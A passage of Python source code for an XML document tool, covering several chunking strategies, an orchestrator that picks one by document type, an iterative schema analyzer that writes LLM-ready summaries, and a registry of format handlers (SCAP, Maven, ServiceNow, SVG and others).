    def _is_semantic_boundary(self, element: ET.Element) -> bool:
        """Check if element is a natural chunking boundary"""
        if not self.config.semantic_boundaries:
            return False
            
        tag = element.tag.split('}')[-1] if '}' in element.tag else element.tag
        return tag in self.config.semantic_boundaries
    
    def _create_chunk(self, element: ET.Element, path: str, 
                     index: int, content: str = None) -> XMLChunk:
        """Create a chunk from an element"""
        if content is None:
            content = ET.tostring(element, encoding='unicode')
            
        # Get parent context if configured
        parent_context = None
        if self.config.include_parent_context:
            parent_context = self._get_parent_context(element)
            
        # Extract metadata
        metadata = {
            'tag': element.tag,
            'attributes': dict(element.attrib),
            'namespace': element.tag.split('}')[0][1:] if '}' in element.tag else None
        }
        
        # Get included elements
        elements_included = list(set(
            e.tag.split('}')[-1] if '}' in e.tag else e.tag 
            for e in element.iter()
        ))
        
        return XMLChunk(
            chunk_id=self.generate_chunk_id(content, index),
            content=content,
            element_path=path,
            start_line=0,  # Would need line tracking for accurate values
            end_line=0,
            parent_context=parent_context,
            metadata=metadata,
            token_estimate=self.estimate_tokens(content),
            elements_included=elements_included
        )
    
    def _split_large_element(self, element: ET.Element, path: str, 
                            start_index: int) -> Generator[XMLChunk, None, None]:
        """Split a large element into multiple chunks"""
        # Strategy: Group children until size limit reached
        current_chunk_elements = []
        current_size = 0
        chunk_index = start_index
        
        for child in element:
            child_content = ET.tostring(child, encoding='unicode')
            child_size = self.estimate_tokens(child_content)
            
            if current_size + child_size > self.config.max_chunk_size and current_chunk_elements:
                # Create chunk from accumulated elements
                yield self._create_chunk_from_elements(
                    current_chunk_elements, element, path, chunk_index
                )
                chunk_index += 1
                current_chunk_elements = [child]
                current_size = child_size
            else:
                current_chunk_elements.append(child)
                current_size += child_size
        
        # Don't forget the last chunk
        if current_chunk_elements:
            yield self._create_chunk_from_elements(
                current_chunk_elements, element, path, chunk_index
            )
    
    def _create_chunk_from_elements(self, elements: List[ET.Element], 
                                   parent: ET.Element, path: str, 
                                   index: int) -> XMLChunk:
        """Create a chunk from a list of elements"""
        # Create a wrapper element
        wrapper = ET.Element(parent.tag, parent.attrib)
        for elem in elements:
            wrapper.append(elem)
            
        return self._create_chunk(wrapper, path, index)
    
    def _process_children(self, element: ET.Element, path: str, 
                         start_index: int) -> Generator[XMLChunk, None, None]:
        """Process children of a non-boundary element"""
        chunk_index = start_index
        for child in element:
            for chunk in self._chunk_element(child, path, chunk_index):
                yield chunk
                chunk_index += 1
    
    def _get_parent_context(self, element: ET.Element) -> str:
        """Get context from parent elements"""
        # This would need access to parent in real implementation
        return f"Parent: {element.tag}"
    
    def _get_semantic_boundaries(self, doc_type: str) -> List[str]:
        """Get semantic boundaries based on document type"""
        boundaries = {
            "SCAP Security Report": ["Rule", "Group", "Benchmark"],
            "SCAP/XSD Schema": ["complexType", "element", "simpleType", "group", "attributeGroup"],
            "SCAP/XCCDF Document": ["Rule", "Group", "Benchmark", "Profile"],
            "ServiceNow Export": ["incident", "sys_journal_field", "sys_attachment"],
            "RSS/Atom Feed": ["item", "entry"],
            "Maven POM": ["dependency", "plugin", "profile"],
            "Spring Configuration": ["bean", "component-scan"],
            "DocBook Documentation": ["chapter", "section", "article"],
            "Log4j Configuration": ["appender", "logger"]
        }
        
        # Fallback with more common XML elements
        default_boundaries = ["section", "record", "item", "entry", "rule", "group", "element", "component"]
        return boundaries.get(doc_type, default_boundaries)

class SlidingWindowChunking(XMLChunkingStrategy):
    """Chunks using a sliding window approach with overlap"""
    
    def chunk_document(self, file_path: str, 
                      specialized_analysis: Dict[str, Any] = None) -> List[XMLChunk]:
        chunks = []
        
        # Read and parse the document
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            
        tree = ET.parse(file_path)
        root = tree.getroot()
        
        # Convert to a list of elements with their content
        elements = self._flatten_elements(root)
        
        # Create chunks with sliding window
        chunk_index = 0
        i = 0
        
        while i < len(elements):
            chunk_elements = []
            chunk_size = 0
            
            # Build chunk up to max size
            j = i
            while j < len(elements) and chunk_size < self.config.max_chunk_size:
                elem_content = elements[j]['content']
                elem_size = self.estimate_tokens(elem_content)
                
                if chunk_size + elem_size <= self.config.max_chunk_size:
                    chunk_elements.append(elements[j])
                    chunk_size += elem_size
                    j += 1
                else:
                    break
            
            # Create chunk if we have content
            if chunk_elements:
                chunk = self._create_chunk_from_flattened(
                    chunk_elements, chunk_index
                )
                chunks.append(chunk)
                chunk_index += 1
                
                # Move window (with overlap)
                overlap_size = 0
                overlap_count = 0
                
                # Count backwards to find overlap point
                for k in range(len(chunk_elements) - 1, -1, -1):
                    overlap_size += self.estimate_tokens(chunk_elements[k]['content'])
                    overlap_count += 1
                    if overlap_size >= self.config.overlap_size:
                        break
                
                i = j - overlap_count + 1
            else:
                i += 1
        
        return chunks
    
    def _flatten_elements(self, root: ET.Element) -> List[Dict[str, Any]]:
        """Flatten XML tree into a list of elements with metadata"""
        flattened = []
        
        def traverse(elem, path=""):
            current_path = f"{path}/{elem.tag}" if path else elem.tag
            
            # Add element info
            flattened.append({
                'element': elem,
                'path': current_path,
                'content': ET.tostring(elem, encoding='unicode'),
                'tag': elem.tag,
                'depth': current_path.count('/')
            })
            
            # Process children
            for child in elem:
                traverse(child, current_path)
        
        traverse(root)
        return flattened
    
    def _create_chunk_from_flattened(self, elements: List[Dict[str, Any]], 
                                    index: int) -> XMLChunk:
        """Create chunk from flattened elements"""
        # Combine content
        content_parts = []
        paths = []
        tags = set()
        
        for elem_info in elements:
            content_parts.append(elem_info['content'])
            paths.append(elem_info['path'])
            tags.add(elem_info['tag'].split('}')[-1] if '}' in elem_info['tag'] else elem_info['tag'])
        
        content = '\n'.join(content_parts)
        
        return XMLChunk(
            chunk_id=self.generate_chunk_id(content, index),
            content=content,
            element_path='; '.join(set(paths[:3])),  # First 3 unique paths
            start_line=0,
            end_line=0,
            parent_context=None,
            metadata={
                'elements_count': len(elements),
                'depth_range': (
                    min(e['depth'] for e in elements),
                    max(e['depth'] for e in elements)
                )
            },
            token_estimate=self.estimate_tokens(content),
            elements_included=list(tags)
        )

class ContentAwareChunking(XMLChunkingStrategy):
    """Chunks based on content type and meaning"""
    
    def __init__(self, config: ChunkingConfig = None):
        super().__init__(config)
        self.content_patterns = {
            'narrative': ['para', 'p', 'description', 'abstract', 'summary'],
            'structured': ['table', 'list', 'itemizedlist', 'orderedlist'],
            'code': ['code', 'programlisting', 'screen', 'computeroutput'],
            'metadata': ['info', 'meta', 'metadata', 'properties']
        }
    
    def chunk_document(self, file_path: str, 
                      specialized_analysis: Dict[str, Any] = None) -> List[XMLChunk]:
        chunks = []
        tree = ET.parse(file_path)
        root = tree.getroot()
        
        # Group elements by content type
        content_groups = self._group_by_content_type(root)
        
        # Create chunks for each content group
        chunk_index = 0
        for content_type, elements in content_groups.items():
            for chunk in self._chunk_content_group(content_type, elements, chunk_index):
                chunks.append(chunk)
                chunk_index += 1
        
        return chunks
    
    def _group_by_content_type(self, root: ET.Element) -> Dict[str, List[ET.Element]]:
        """Group elements by their content type"""
        groups = {
            'narrative': [],
            'structured': [],
            'code': [],
            'metadata': [],
            'other': []
        }
        
        for elem in root.iter():
            content_type = self._determine_content_type(elem)
            groups[content_type].append(elem)
        
        return {k: v for k, v in groups.items() if v}  # Remove empty groups
    
    def _determine_content_type(self, element: ET.Element) -> str:
        """Determine the content type of an element"""
        tag = element.tag.split('}')[-1] if '}' in element.tag else element.tag
        
        for content_type, patterns in self.content_patterns.items():
            if tag.lower() in patterns:
                return content_type
        
        # Check children for hints
        child_tags = [
            child.tag.split('}')[-1] if '}' in child.tag else child.tag 
            for child in element
        ]
        
        for content_type, patterns in self.content_patterns.items():
            if any(ct.lower() in patterns for ct in child_tags):
                return content_type
        
        return 'other'
    
    def _chunk_content_group(self, content_type: str, elements: List[ET.Element], 
                           start_index: int) -> Generator[XMLChunk, None, None]:
        """Create chunks for a group of similar content"""
        # Use different strategies based on content type
        if content_type == 'narrative':
            yield from self._chunk_narrative(elements, start_index)
        elif content_type == 'code':
            yield from self._chunk_code(elements, start_index)
        elif content_type == 'structured':
            yield from self._chunk_structured(elements, start_index)
        else:
            yield from self._chunk_generic(elements, start_index)
    
    def _chunk_narrative(self, elements: List[ET.Element], 
                        start_index: int) -> Generator[XMLChunk, None, None]:
        """Chunk narrative content, trying to keep paragraphs together"""
        current_content = []
        current_size = 0
        chunk_index = start_index
        
        for elem in elements:
            elem_text = ET.tostring(elem, encoding='unicode')
            elem_size = self.estimate_tokens(elem_text)
            
            if current_size + elem_size > self.config.max_chunk_size and current_content:
                # Create chunk
                yield self._create_narrative_chunk(current_content, chunk_index)
                chunk_index += 1
                
                # Start new chunk with overlap
                overlap_elements = self._get_overlap_elements(current_content)
                current_content = overlap_elements + [elem_text]
                current_size = sum(self.estimate_tokens(e) for e in current_content)
            else:
                current_content.append(elem_text)
                current_size += elem_size
        
        if current_content:
            yield self._create_narrative_chunk(current_content, chunk_index)
    
    def _chunk_code(self, elements: List[ET.Element], 
                   start_index: int) -> Generator[XMLChunk, None, None]:
        """Chunk code content, trying to keep code blocks intact"""
        for i, elem in enumerate(elements):
            content = ET.tostring(elem, encoding='unicode')
            tokens = self.estimate_tokens(content)
            
            if tokens <= self.config.max_chunk_size:
                # Single code block fits
                yield XMLChunk(
                    chunk_id=self.generate_chunk_id(content, start_index + i),
                    content=content,
                    element_path=self._get_element_path(elem),
                    start_line=0,
                    end_line=0,
                    parent_context=None,
                    metadata={'content_type': 'code', 'language': elem.get('language', 'unknown')},
                    token_estimate=tokens,
                    elements_included=['code']
                )
            else:
                # Split large code block
                yield from self._split_large_code_block(elem, start_index + i)
    
    def _chunk_structured(self, elements: List[ET.Element], 
                         start_index: int) -> Generator[XMLChunk, None, None]:
        """Chunk structured content like tables and lists"""
        for i, elem in enumerate(elements):
            content = ET.tostring(elem, encoding='unicode')
            
            yield XMLChunk(
                chunk_id=self.generate_chunk_id(content, start_index + i),
                content=content,
                element_path=self._get_element_path(elem),
                start_line=0,
                end_line=0,
                parent_context=None,
                metadata={'content_type': 'structured', 'structure_type': elem.tag},
                token_estimate=self.estimate_tokens(content),
                elements_included=[elem.tag]
            )
    
    def _chunk_generic(self, elements: List[ET.Element], 
                      start_index: int) -> Generator[XMLChunk, None, None]:
        """Generic chunking for other content"""
        for i, elem in enumerate(elements):
            content = ET.tostring(elem, encoding='unicode')
            
            yield XMLChunk(
                chunk_id=self.generate_chunk_id(content, start_index + i),
                content=content,
                element_path=self._get_element_path(elem),
                start_line=0,
                end_line=0,
                parent_context=None,
                metadata={'content_type': 'other'},
                token_estimate=self.estimate_tokens(content),
                elements_included=[elem.tag]
            )
    
    def _create_narrative_chunk(self, content_list: List[str], index: int) -> XMLChunk:
        """Create a chunk from narrative content"""
        content = '\n'.join(content_list)
        
        return XMLChunk(
            chunk_id=self.generate_chunk_id(content, index),
            content=content,
            element_path="narrative_section",
            start_line=0,
            end_line=0,
            parent_context=None,
            metadata={'content_type': 'narrative', 'paragraph_count': len(content_list)},
            token_estimate=self.estimate_tokens(content),
            elements_included=['para', 'p', 'description']
        )
    
    def _get_overlap_elements(self, content_list: List[str]) -> List[str]:
        """Get elements for overlap from the end of content list"""
        overlap_elements = []
        overlap_size = 0
        
        for content in reversed(content_list):
            overlap_size += self.estimate_tokens(content)
            overlap_elements.insert(0, content)
            
            if overlap_size >= self.config.overlap_size:
                break
        
        return overlap_elements
    
    def _split_large_code_block(self, elem: ET.Element, 
                               index: int) -> Generator[XMLChunk, None, None]:
        """Split a large code block into smaller chunks"""
        # This is a simplified version - real implementation would be smarter
        text = elem.text or ""
        lines = text.split('\n')
        
        current_chunk = []
        current_size = 0
        chunk_num = 0
        
        for line in lines:
            line_size = self.estimate_tokens(line)
            
            if current_size + line_size > self.config.max_chunk_size and current_chunk:
                # Create chunk
                content = '\n'.join(current_chunk)
                yield XMLChunk(
                    chunk_id=self.generate_chunk_id(content, index + chunk_num),
                    content=f"<code>{content}</code>",
                    element_path=self._get_element_path(elem),
                    start_line=0,
                    end_line=0,
                    parent_context=None,
                    metadata={
                        'content_type': 'code',
                        'language': elem.get('language', 'unknown'),
                        'part': chunk_num + 1
                    },
                    token_estimate=current_size,
                    elements_included=['code']
                )
                
                chunk_num += 1
                current_chunk = [line]
                current_size = line_size
            else:
                current_chunk.append(line)
                current_size += line_size
        
        # Last chunk
        if current_chunk:
            content = '\n'.join(current_chunk)
            yield XMLChunk(
                chunk_id=self.generate_chunk_id(content, index + chunk_num),
                content=f"<code>{content}</code>",
                element_path=self._get_element_path(elem),
                start_line=0,
                end_line=0,
                parent_context=None,
                metadata={
                    'content_type': 'code',
                    'language': elem.get('language', 'unknown'),
                    'part': chunk_num + 1
                },
                token_estimate=current_size,
                elements_included=['code']
            )
    
    def _get_element_path(self, elem: ET.Element) -> str:
        """Get a simple path representation for an element"""
        # In real implementation, would track actual path
        return elem.tag

class ChunkingOrchestrator:
    """Orchestrates the chunking process using appropriate strategies"""
    
    def __init__(self):
        self.strategies = {
            'hierarchical': HierarchicalChunking,
            'sliding_window': SlidingWindowChunking,
            'content_aware': ContentAwareChunking
        }
    
    def chunk_document(self, file_path: str, 
                      specialized_analysis: Dict[str, Any],
                      strategy: str = 'auto',
                      config: ChunkingConfig = None) -> List[XMLChunk]:
        """Chunk a document using the appropriate strategy"""
        
        if strategy == 'auto':
            strategy = self._select_strategy(specialized_analysis)
        
        if strategy not in self.strategies:
            raise ValueError(f"Unknown strategy: {strategy}")
        
        # Create strategy instance
        strategy_class = self.strategies[strategy]
        chunker = strategy_class(config)
        
        # Apply document-specific configuration
        if config is None:
            config = self._create_config_for_document(specialized_analysis)
            chunker.config = config
        
        # Perform chunking
        chunks = chunker.chunk_document(file_path, specialized_analysis)
        
        # Post-process chunks
        chunks = self._post_process_chunks(chunks, specialized_analysis)
        
        return chunks
    
    def _select_strategy(self, analysis: Dict[str, Any]) -> str:
        """Select the best chunking strategy based on document analysis"""
        doc_type = analysis.get('document_type', {}).get('type_name', '')
        
        # Strategy selection based on document type
        strategy_map = {
            'SCAP Security Report': 'hierarchical',
            'SCAP/XSD Schema': 'hierarchical',
            'SCAP/XCCDF Document': 'hierarchical',
            'ServiceNow Export': 'sliding_window',  # Conversation-heavy format
            'RSS/Atom Feed': 'hierarchical',
            'Maven POM': 'hierarchical',
            'Spring Configuration': 'hierarchical',
            'DocBook Documentation': 'content_aware',
            'Log4j Configuration': 'hierarchical',
            'SVG Graphics': 'hierarchical'
        }
        
        return strategy_map.get(doc_type, 'sliding_window')
    
    def _create_config_for_document(self, analysis: Dict[str, Any]) -> ChunkingConfig:
        """Create optimal chunking configuration for document"""
        doc_type = analysis.get('document_type', {}).get('type_name', '')
        
        # Base configuration
        config = ChunkingConfig()
        
        # Adjust based on document type
        if 'Documentation' in doc_type:
            config.max_chunk_size = 4000  # Larger chunks for documentation
            config.preserve_hierarchy = True
            config.include_parent_context = True
        elif 'Configuration' in doc_type:
            config.max_chunk_size = 2000  # Smaller chunks for configs
            config.preserve_hierarchy = True
        elif 'Feed' in doc_type:
            config.max_chunk_size = 1500  # Individual items
            config.overlap_size = 0  # No overlap needed
        
        return config
    
    def _post_process_chunks(self, chunks: List[XMLChunk], 
                           analysis: Dict[str, Any]) -> List[XMLChunk]:
        """Post-process chunks to add additional metadata"""
        doc_type = analysis.get('document_type', {}).get('type_name', '')
        
        for i, chunk in enumerate(chunks):
            # Add document context
            chunk.metadata['document_type'] = doc_type
            chunk.metadata['chunk_index'] = i
            chunk.metadata['total_chunks'] = len(chunks)
            
            # Add navigation info
            if i > 0:
                chunk.metadata['previous_chunk'] = chunks[i-1].chunk_id
            if i < len(chunks) - 1:
                chunk.metadata['next_chunk'] = chunks[i+1].chunk_id
        
        return chunks

# Example usage
if __name__ == "__main__":
    # Example: Using the chunking orchestrator
    from core.analyzer import XMLDocumentAnalyzer
    
    # Analyze document first
    analyzer = XMLDocumentAnalyzer()
    analysis = analyzer.analyze_document("sample_data/example.xml")
    
    # Chunk the document
    orchestrator = ChunkingOrchestrator()
    chunks = orchestrator.chunk_document(
        "sample_data/example.xml",
        analysis,
        strategy='auto'  # Let it choose the best strategy
    )
    
    # Display results
    print(f"Document chunked into {len(chunks)} chunks")
    for chunk in chunks[:3]:  # Show first 3 chunks
        print(f"\nChunk {chunk.chunk_id}:")
        print(f"  Path: {chunk.element_path}")
        print(f"  Tokens: ~{chunk.token_estimate}")
        print(f"  Elements: {', '.join(chunk.elements_included[:5])}")
        print(f"  Content preview: {chunk.content[:100]}...")
</file>

<file path="src/core/schema_analyzer.py">
#!/usr/bin/env python3
"""
Fixed XML Schema Analyzer for Large Files

Handles very large XML files efficiently using iterative parsing
instead of recursive analysis to avoid stack overflow.
"""

import xml.etree.ElementTree as ET
from collections import defaultdict, deque
import json
import sys
from typing import Dict, List, Set, Any, Optional
from dataclasses import dataclass, asdict

@dataclass
class ElementInfo:
    """Information about an XML element"""
    tag: str
    count: int
    depth_levels: Set[int]
    attributes: Dict[str, Set[str]]
    text_patterns: List[str]
    parent_elements: Set[str]
    child_elements: Set[str]

@dataclass
class XMLSchema:
    """Complete XML schema information"""
    root_element: str
    namespaces: Dict[str, str]
    elements: Dict[str, ElementInfo]
    max_depth: int
    total_elements: int
    structure_tree: Dict[str, Any]
    sample_paths: List[str]

class XMLSchemaAnalyzer:
    def __init__(self, max_samples=3, max_text_length=100, max_analysis_depth=15):
        self.max_samples = max_samples
        self.max_text_length = max_text_length
        self.max_analysis_depth = max_analysis_depth  # Prevent infinite analysis
        
        self.elements = defaultdict(lambda: ElementInfo(
            tag="", count=0, depth_levels=set(), attributes=defaultdict(set),
            text_patterns=[], parent_elements=set(), child_elements=set()
        ))
        self.namespaces = {}
        self.structure_tree = {}
        self.sample_paths = []
        self.max_depth = 0
        
        # Set a reasonable recursion limit
        sys.setrecursionlimit(3000)

    def clean_tag(self, tag: str) -> str:
        """Remove namespace prefix from tag for cleaner analysis"""
        return tag.split('}')[-1] if '}' in tag else tag

    def get_namespace(self, tag: str) -> Optional[str]:
        """Extract namespace from tag"""
        if '}' in tag:
            return tag.split('}')[0][1:]  # Remove leading {
        return None

    def analyze_file_iterative(self, file_path: str) -> XMLSchema:
        """Analyze XML file using iterative parsing for large files"""
        print(f"Using iterative parsing for large file: {file_path}")
        
        # Use iterparse for memory-efficient parsing
        context = ET.iterparse(file_path, events=('start', 'end', 'start-ns'))
        
        element_stack = []
        path_stack = []
        elements_processed = 0
        max_elements = 50000  # Limit analysis to prevent excessive processing
        
        root_element = None
        
        try:
            for event, elem in context:
                if elements_processed > max_elements:
                    print(f"Reached analysis limit of {max_elements} elements")
                    break
                    
                if event == 'start-ns':
                    # Handle namespace declarations
                    prefix, uri = elem
                    self.namespaces[prefix or 'default'] = uri
                    
                elif event == 'start':
                    if root_element is None:
                        root_element = self.clean_tag(elem.tag)
                    
                    clean_tag = self.clean_tag(elem.tag)
                    depth = len(element_stack)
                    
                    # Limit depth analysis
                    if depth > self.max_analysis_depth:
                        continue
                    
                    self.max_depth = max(self.max_depth, depth)
                    
                    # Update element info
                    element_info = self.elements[clean_tag]
                    element_info.tag = clean_tag
                    element_info.count += 1
                    element_info.depth_levels.add(depth)
                    
                    # Parent-child relationships
                    if element_stack:
                        parent_tag = element_stack[-1]
                        element_info.parent_elements.add(parent_tag)
                        self.elements[parent_tag].child_elements.add(clean_tag)
                    
                    # Analyze attributes (limit to avoid memory issues)
                    for attr_name, attr_value in list(elem.attrib.items())[:10]:
                        clean_attr = self.clean_tag(attr_name)
                        # Limit attribute value length and count
                        if len(element_info.attributes[clean_attr]) < 5:
                            element_info.attributes[clean_attr].add(attr_value[:50])
                    
                    # Store sample paths
                    if depth <= 3 and len(self.sample_paths) < 20:
                        current_path = '/'.join(path_stack + [clean_tag])
                        self.sample_paths.append(current_path)
                    
                    element_stack.append(clean_tag)
                    path_stack.append(clean_tag)
                    elements_processed += 1
                    
                elif event == 'end':
                    clean_tag = self.clean_tag(elem.tag)
                    
                    # Store text content if present and not too deep
                    if elem.text and elem.text.strip() and len(element_stack) <= self.max_analysis_depth:
                        if clean_tag in self.elements:
                            element_info = self.elements[clean_tag]
                            if len(element_info.text_patterns) < self.max_samples:
                                text = elem.text.strip()[:self.max_text_length]
                                if text:  # Only store non-empty text
                                    element_info.text_patterns.append(text)
                    
                    # Pop from stacks
                    if element_stack and element_stack[-1] == clean_tag:
                        element_stack.pop()
                    if path_stack and path_stack[-1] == clean_tag:
                        path_stack.pop()
                    
                    # Clear element to save memory
                    elem.clear()
                    
                # Progress indicator for very large files
                if elements_processed % 10000 == 0 and elements_processed > 0:
                    print(f"Processed {elements_processed:,} elements...")
                    
        except Exception as e:
            print(f"Warning: Parsing stopped early due to: {e}")
            print(f"Analyzed {elements_processed:,} elements before stopping")
        
        # Build structure tree (limited depth to avoid recursion issues)
        self.structure_tree = self._build_structure_tree_iterative()
        
        # Create schema
        total_elements = sum(info.count for info in self.elements.values())
        
        return XMLSchema(
            root_element=root_element or "unknown",
            namespaces=self.namespaces,
            elements=dict(self.elements),  # Convert defaultdict
            max_depth=self.max_depth,
            total_elements=total_elements,
            structure_tree=self.structure_tree,
            sample_paths=self.sample_paths
        )

    def _build_structure_tree_iterative(self) -> Dict[str, Any]:
        """Build structure tree without recursion"""
        tree = {}
        
        # Find root elements (no parents)
        root_elements = []
        for tag, info in self.elements.items():
            if not info.parent_elements:
                root_elements.append(tag)
        
        # Build tree for each root (limit depth)
        for root_tag in root_elements:
            tree[root_tag] = self._build_subtree_limited(root_tag, max_depth=5)
        
        return tree

    def _build_subtree_limited(self, tag: str, current_depth=0, max_depth=5) -> Dict[str, Any]:
        """Build subtree with depth limit to avoid recursion issues"""
        if current_depth >= max_depth or tag not in self.elements:
            return {"truncated": True}
        
        info = self.elements[tag]
        node = {
            "count": info.count,
            "attributes": list(info.attributes.keys())[:5],  # Limit attributes shown
            "has_text": len(info.text_patterns) > 0,
            "children": {}
        }
        
        # Add children (limited)
        for child_tag in list(info.child_elements)[:10]:  # Limit children
            if child_tag in self.elements:
                node["children"][child_tag] = self._build_subtree_limited(
                    child_tag, current_depth + 1, max_depth
                )
        
        return node

    def analyze_file(self, file_path: str) -> XMLSchema:
        """Main analysis method - chooses appropriate strategy"""
        import os
        
        file_size = os.path.getsize(file_path)
        size_mb = file_size / (1024 * 1024)
        
        print(f"File size: {size_mb:.1f} MB")
        
        # Use iterative parsing for files larger than 5MB
        if size_mb > 5:
            return self.analyze_file_iterative(file_path)
        else:
            # For smaller files, use the original method but with safety limits
            return self.analyze_file_iterative(file_path)

    def generate_llm_description(self, schema: XMLSchema) -> str:
        """Generate a concise description suitable for LLM consumption"""
        description = f"""XML Document Schema Analysis

Document Type: {schema.root_element}
Total Elements: {schema.total_elements:,}
Maximum Depth: {schema.max_depth}
Unique Element Types: {len(schema.elements)}

NAMESPACES:
{json.dumps(schema.namespaces, indent=2)}

DOCUMENT STRUCTURE:
Root: {schema.root_element}
Sample Paths: {', '.join(schema.sample_paths[:10])}

KEY ELEMENTS (Top 10 by frequency):
"""
        
        # Sort elements by count
        sorted_elements = sorted(schema.elements.items(), 
                               key=lambda x: x[1].count, reverse=True)[:10]
        
        for tag, info in sorted_elements:
            attrs_summary = f"[{len(info.attributes)} attrs]" if info.attributes else "[no attrs]"
            text_summary = "[has text]" if info.text_patterns else "[no text]"
            children_summary = f"[{len(info.child_elements)} children]" if info.child_elements else "[leaf]"
            
            description += f"\n- {tag}: {info.count:,} occurrences, depths {sorted(info.depth_levels)[:5]} {attrs_summary} {text_summary} {children_summary}"
            
            # Show key attributes
            if info.attributes:
                key_attrs = list(info.attributes.keys())[:3]
                description += f"\n  Key attributes: {', '.join(key_attrs)}"
            
            # Show sample text
            if info.text_patterns:
                sample_text = info.text_patterns[0][:50]
                description += f"\n  Sample text: \"{sample_text}...\""

        # Simplified structure tree (avoid deep nesting in output)
        description += f"\n\nSTRUCTURE SUMMARY:\n"
        for root_elem, tree_info in list(schema.structure_tree.items())[:3]:
            description += f"- {root_elem}: {tree_info.get('count', 0)} occurrences\n"
            if 'children' in tree_info:
                child_count = len(tree_info['children'])
                if child_count > 0:
                    child_names = list(tree_info['children'].keys())[:5]
                    description += f"  Children ({child_count}): {', '.join(child_names)}\n"
        
        return description

def analyze_xml_file(file_path: str, output_json: bool = False) -> str:
    """Main function to analyze XML file"""
    analyzer = XMLSchemaAnalyzer(max_samples=3, max_analysis_depth=15)
    schema = analyzer.analyze_file(file_path)
    
    if output_json:
        # Convert to dict for JSON serialization
        schema_dict = asdict(schema)
        # Convert sets to lists for JSON
        for element_info in schema_dict['elements'].values():
            if 'depth_levels' in element_info:
                element_info['depth_levels'] = list(element_info['depth_levels'])
            if 'parent_elements' in element_info:
                element_info['parent_elements'] = list(element_info['parent_elements'])
            if 'child_elements' in element_info:
                element_info['child_elements'] = list(element_info['child_elements'])
            if 'attributes' in element_info:
                for attr_name in element_info['attributes']:
                    element_info['attributes'][attr_name] = list(element_info['attributes'][attr_name])
        
        return json.dumps(schema_dict, indent=2)
    else:
        return analyzer.generate_llm_description(schema)

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python xml_analyzer.py <xml_file> [--json]")
        sys.exit(1)
    
    file_path = sys.argv[1]
    output_json = "--json" in sys.argv
    
    try:
        result = analyze_xml_file(file_path, output_json)
        print(result)
    except Exception as e:
        print(f"Error analyzing XML file: {e}")
        sys.exit(1)
</file>

<file path="src/handlers/__init__.py">
"""
XML Handlers Registry

Centralized registry for all XML document handlers.
This module provides a single import point for all handlers and maintains
the handler registry used by the main analyzer.
"""

# Core handlers (moved from main files) - only import what exists
from .scap_handler import SCAPHandler
from .rss_handler import RSSHandler
from .maven_pom_handler import MavenPOMHandler
from .spring_config_handler import SpringConfigHandler
from .generic_xml_handler import GenericXMLHandler

# New handlers
from .ant_build_handler import AntBuildHandler
from .soap_envelope_handler import SOAPEnvelopeHandler
from .saml_handler import SAMLHandler
from .hibernate_handler import HibernateHandler
from .ivy_handler import IvyHandler

# Migrated handlers
from .log4j_config_handler import Log4jConfigHandler
from .svg_handler import SVGHandler
from .docbook_handler import DocBookHandler
from .sitemap_handler import SitemapHandler
from .kml_handler import KMLHandler
from .gpx_handler import GPXHandler
from .xhtml_handler import XHTMLHandler
from .wadl_handler import WADLHandler
from .struts_config_handler import StrutsConfigHandler
from .graphml_handler import GraphMLHandler
from .xliff_handler import XLIFFHandler

# IT Service Management
from .servicenow_handler import ServiceNowHandler

# Existing handlers (already in individual files)
from .bpmn_handler import BPMNHandler
from .enterprise_config_handler import EnterpriseConfigHandler
from .openapi_xml_handler import OpenAPIXMLHandler
from .properties_xml_handler import PropertiesXMLHandler
from .test_report_handler import TestReportHandler
from .wsdl_handler import WSDLHandler
from .xsd_handler import XSDSchemaHandler

# Registry of all available handlers (order matters - most specific first)
ALL_HANDLERS = [
    # Security and compliance
    SCAPHandler,
    SAMLHandler,
    
    # Build tools and frameworks
    MavenPOMHandler,
    SpringConfigHandler,
    AntBuildHandler,
    IvyHandler,
    Log4jConfigHandler,
    StrutsConfigHandler,
    
    # Enterprise configuration
    EnterpriseConfigHandler,
    PropertiesXMLHandler,
    HibernateHandler,
    
    # IT Service Management
    ServiceNowHandler,
    
    # Business process and workflow
    BPMNHandler,
    
    # Web services and APIs
    WSDLHandler,
    OpenAPIXMLHandler,
    SOAPEnvelopeHandler,
    WADLHandler,
    
    # Content and documentation
    RSSHandler,
    DocBookHandler,
    SitemapHandler,
    
    # Web content
    XHTMLHandler,
    
    # Geographic and mapping
    KMLHandler,
    GPXHandler,
    
    # Graphics and media
    SVGHandler,
    
    # Network and graph data
    GraphMLHandler,
    
    # Translation/localization
    XLIFFHandler,
    
    # Testing
    TestReportHandler,
    
    # Schemas and definitions
    XSDSchemaHandler,
    
    # Fallback (always last)
    GenericXMLHandler,
]

# Categorized handlers for easier management
HANDLER_CATEGORIES = {
    'security': [SCAPHandler, SAMLHandler],
    'build_tools': [MavenPOMHandler, AntBuildHandler, IvyHandler],
    'frameworks': [SpringConfigHandler, Log4jConfigHandler, StrutsConfigHandler],
    'web_services': [WSDLHandler, OpenAPIXMLHandler, SOAPEnvelopeHandler, WADLHandler],
    'business_process': [BPMNHandler],
    'enterprise_config': [EnterpriseConfigHandler, PropertiesXMLHandler, HibernateHandler],
    'it_service_management': [ServiceNowHandler],
    'content': [RSSHandler, DocBookHandler, SitemapHandler],
    'web_content': [XHTMLHandler],
    'geographic': [KMLHandler, GPXHandler],
    'graphics': [SVGHandler],
    'network_data': [GraphMLHandler],
    'localization': [XLIFFHandler],
    'schemas': [XSDSchemaHandler],
    'testing': [TestReportHandler],
    'fallback': [GenericXMLHandler]
}

# Export handler classes for backward compatibility
__all__ = [
    'ALL_HANDLERS',
    'HANDLER_CATEGORIES',
    'SCAPHandler',
    'RSSHandler',
    'MavenPOMHandler',
    'SpringConfigHandler',
    'AntBuildHandler',
    'SOAPEnvelopeHandler',
    'SAMLHandler',
    'HibernateHandler',
    'IvyHandler',
    'Log4jConfigHandler',
    'SVGHandler',
    'DocBookHandler',
    'SitemapHandler',
    'KMLHandler',
    'GPXHandler',
    'XHTMLHandler',
    'WADLHandler',
    'StrutsConfigHandler',
    'GraphMLHandler',
    'XLIFFHandler',
    'GenericXMLHandler',
    'BPMNHandler',
    'EnterpriseConfigHandler',
    'OpenAPIXMLHandler',
    'PropertiesXMLHandler',
    'TestReportHandler',
    'WSDLHandler',
    'XSDSchemaHandler',
    'ServiceNowHandler',
]
</file>

<file path="src/handlers/ant_build_handler.py">
#!/usr/bin/env python3
"""
Apache Ant Build Handler

Analyzes Apache Ant build.xml files to extract build targets, tasks,
properties, and dependencies for build analysis and CI/CD optimization.
"""

